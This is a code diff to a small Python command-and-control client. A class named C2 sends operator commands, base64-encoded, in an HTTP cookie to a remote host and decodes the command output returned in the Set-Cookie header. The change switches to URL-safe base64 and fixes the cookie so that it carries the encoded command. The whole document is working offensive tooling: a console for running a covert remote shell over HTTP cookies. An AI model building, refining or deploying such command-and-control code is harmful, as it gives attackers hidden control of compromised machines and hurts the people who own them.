@@ -1,6 +1,6 @@
 import requests
 import cmd
-from base64 import b64decode, b64encode
+from base64 import urlsafe_b64decode, urlsafe_b64encode
 import argparse
 
 parser = argparse.ArgumentParser()
@@ -15,11 +15,11 @@ class C2(cmd.Cmd):
         prompt = '=>'
 
         def default(self, command):
-                encoded_command = b64encode(command.encode()).decode()
-                response = requests.get('http://{}:{}/'.format(ip, port), cookies={'Cookie': command})
+                encoded_command = urlsafe_b64encode(command.encode()).decode()
+                response = requests.get('http://{}:{}/'.format(ip, port), cookies={'Cookie': encoded_command})
                 headers = response.headers
                 encoded_output = headers['Set-Cookie']
-                output = b64decode(encoded_output.encode()).decode()
+                output = urlsafe_b64decode(encoded_output.encode()).decode()
                 print(output)
 
 C2().cmdloop()
